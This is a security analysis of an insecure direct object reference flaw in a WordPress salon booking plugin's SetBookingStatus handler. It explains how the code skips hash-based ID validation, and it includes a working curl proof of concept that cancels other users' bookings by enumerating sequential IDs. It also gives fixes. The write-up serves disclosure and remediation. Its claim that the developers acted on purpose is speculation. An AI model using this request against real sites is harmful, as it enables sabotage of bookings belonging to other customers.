# Security Bypass Analysis: SetBookingStatus IDOR

## Executive Summary

The plugin developers built a secure ID validation system in `createBooking()` but **deliberately bypass it** in `SetBookingStatus` by using `intval()`. This converts secure string IDs (`"123-abc456def"`) to plain integers (`123`), skipping hash validation and enabling IDOR attacks.

---

## The Security System (Built But Bypassed)

### How createBooking() Works

**File:** `src/SLN/Plugin.php:81-96`

```php
public function createBooking($booking)
{
    // PATH 1: Secure validation (string with dash)
    if (is_string($booking) && strpos($booking, '-') !== false) {
        $booking = str_replace('?sln_step_page=summary', '', $booking);
        $secureId = $booking;           // Save: "123-abc456def789"
        $booking = intval($booking);    // Extract: 123
    }

    // PATH 2: No validation (plain integer)
    if (is_int($booking)) {
        $booking = get_post($booking);  // Fetch booking #123 from database
    }

    $ret = new SLN_Wrapper_Booking($booking);

    // SECURITY CHECK: Only runs if $secureId was set (PATH 1)
    if (isset($secureId) && $ret->getUniqueId() != $secureId) {
        throw new Exception('Not allowed, failing secure id');
    }

    return $ret;
}
```

**Two Paths:**

| Input Type | Path Taken | Validated? | Example |
|------------|------------|------------|---------|
| String with dash | PATH 1 | ✅ YES | `createBooking("123-abc456def")` |
| Plain integer | PATH 2 | ❌ NO | `createBooking(123)` |

---

## The Vulnerability: Forcing the Insecure Path

### SetBookingStatus Code

**File:** `src/SLN/Action/Ajax/SetBookingStatus.php:1-35`

```php
<?php // algolplus
// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing

class SLN_Action_Ajax_SetBookingStatus extends SLN_Action_Ajax_Abstract
{
    private $errors = array();

    public function execute()
    {
        if (!is_user_logged_in()) {
            return array('redirect' => wp_login_url());
        }

        if (!defined("SLN_VERSION_PAY")) {
            return array();  // Disabled in FREE version
        }

        $plugin = SLN_Plugin::getInstance();
        if(!isset($_POST['booking_id']) && !isset($_POST['status'])) {
            return array('success' => 0, 'status' => 'failure');
        }

        // LINE 22: THE VULNERABILITY
        $booking = $plugin->createBooking(intval($_POST['booking_id']));
        //                                ^^^^^^
        //                                Converts "123-abc456def" → 123
        //                                Forces PATH 2 (no validation)

        // NO OWNERSHIP CHECK!
        if (in_array($_POST['status'], array(SLN_Enum_BookingStatus::CONFIRMED,
                                              SLN_Enum_BookingStatus::CANCELED))) {
            $booking->setStatus(wp_unslash($_POST['status']));
        }

        $status = SLN_Enum_BookingStatus::getLabel($booking->getStatus());
        $color  = SLN_Enum_BookingStatus::getRealColor($booking->getStatus());
        // ... HTML generation ...

        return array('success' => 1, 'status' => $statusLabel);
    }
}
```

---

## How the Bypass Works

### Attack Flow

```php
// Attacker sends AJAX request:
POST /wp-admin/admin-ajax.php
action=salon&method=setBookingStatus&booking_id=123&status=sln-b-canceled
```

**Step-by-step:**

1. **Line 22:** `intval($_POST['booking_id'])`
   - Input: `$_POST['booking_id'] = "123"` (string from HTTP)
   - Output: `123` (integer)

2. **Plugin.php:83:** Check if string with dash
   ```php
   is_string(123) && strpos(123, '-') !== false  // ❌ FALSE (it's an integer)
   ```
   **PATH 1 SKIPPED**

3. **Plugin.php:88:** Check if integer
   ```php
   is_int(123)  // ✅ TRUE
   ```
   **PATH 2 TAKEN**

4. **Plugin.php:89:** Fetch booking
   ```php
   $booking = get_post(123);  // Retrieves ANY booking with ID 123
   ```

5. **Plugin.php:92:** Security check
   ```php
   if (isset($secureId) && ...)  // ❌ $secureId not set, check skipped
   ```

6. **SetBookingStatus.php:26:** Modify booking
   ```php
   $booking->setStatus('sln-b-canceled');  // Changes OTHER user's booking!
   ```

---

## Why This Is a Security Bypass

### Evidence of Developer Knowledge

1. **They built the secure ID system** (`getUniqueId()`, validation logic)
2. **They use it in some places** (payment URLs, cancel URLs)
3. **They deliberately bypass it here** by using `intval()`

**From SetBookingStatus.php:2:**
```php
// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing
```
↑ **They know they're violating WordPress security standards**

---

## Secure vs Insecure Usage

### ✅ Secure Example (RescheduleBooking.php:33)

```php
$booking = $this->plugin->createBooking($_GET['booking_id']);
//                                      ^^^^^^^^^^^^^^^^^^^^
//                                      No intval() - allows secure format
```

If user provides `booking_id=123-abc456def`, validation runs.

### ❌ Insecure Example (SetBookingStatus.php:22)

```php
$booking = $plugin->createBooking(intval($_POST['booking_id']));
//                                ^^^^^^
//                                Strips hash, bypasses validation
```

Even if user provides `booking_id=123-abc456def`, `intval()` converts it to `123`.

---

## The IDOR Vulnerability

### Why Enumeration Works

**Bookings are WordPress posts with sequential IDs:**

**File:** `src/SLN/Wrapper/Booking/Builder.php:399`
```php
$id = wp_insert_post(array('post_type' => 'sln_booking'));
// Returns: 123, 124, 125, 126... (WordPress AUTO_INCREMENT)
```

**Attack strategy:**
1. Attacker creates booking → Receives ID `100`
2. Knows IDs `1-99` exist (previous bookings)
3. Enumerates: `99, 98, 97, 96...`
4. Calls `setBookingStatus` with each ID

---

## Proof of Concept

```bash
# 1. Attacker creates booking, gets ID 100
# 2. View their booking ID in "My Account" page
# 3. Enumerate and attack previous bookings

curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_attacker_cookie...' \
  --data 'action=salon&method=setBookingStatus&booking_id=95&status=sln-b-canceled'

# Booking #95 (belongs to different user) is now CANCELED
```

**No errors, no ownership check, attack succeeds.**

---

## Impact

| Attack Scenario | Impact |
|----------------|--------|
| Cancel competitor bookings | Business disruption |
| Mark own bookings as paid | Payment bypass |
| Mark others as paid | Accounting chaos |
| Deny service | Customer dissatisfaction |

---

## Remediation

### Option 1: Remove intval() (Use Built-in Security)

```php
// SetBookingStatus.php:22
// BEFORE:
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// AFTER:
$booking = $plugin->createBooking($_POST['booking_id']);
```

**Result:** Forces secure ID format `"123-abc456def"`, validates hash automatically.

### Option 2: Add Ownership Check

```php
// SetBookingStatus.php:22-24
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// ADD THIS:
if ($booking->getUserId() != get_current_user_id()) {
    return array('error' => 'Unauthorized access');
}

if (in_array($_POST['status'], ...)) {
    $booking->setStatus(wp_unslash($_POST['status']));
}
```

### Option 3: Defense in Depth (Both)

```php
$booking = $plugin->createBooking($_POST['booking_id']);  // Secure ID validation

if ($booking->getUserId() != get_current_user_id()) {     // Ownership check
    return array('error' => 'Unauthorized access');
}
```

---

## Comparison: Secure Implementation Example

**File:** `src/SLN/Action/Ajax/CancelBooking.php:16-28`

```php
$booking = $plugin->createBooking(intval($_POST['id']));

$available = $booking->getUserId() == get_current_user_id();  // ✅ Ownership check

if ($cancellationEnabled && !$outOfTime && $available) {
    $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
} elseif (!$available) {
    $this->addError(__("You don't have access", 'salon-booking-system'));
}
```

**CancelBooking has proper authorization, SetBookingStatus does not.**

---

## Conclusion

The developers:
1. ✅ Built a secure ID validation system
2. ✅ Generate secure IDs for bookings
3. ❌ **Bypass their own security** using `intval()` in `SetBookingStatus`
4. ❌ **Suppress security warnings** (`phpcs:ignoreFile`)
5. ❌ **Implement proper checks elsewhere** (CancelBooking), proving they know how

**This is not an oversight—it's a security bypass of their own system.**
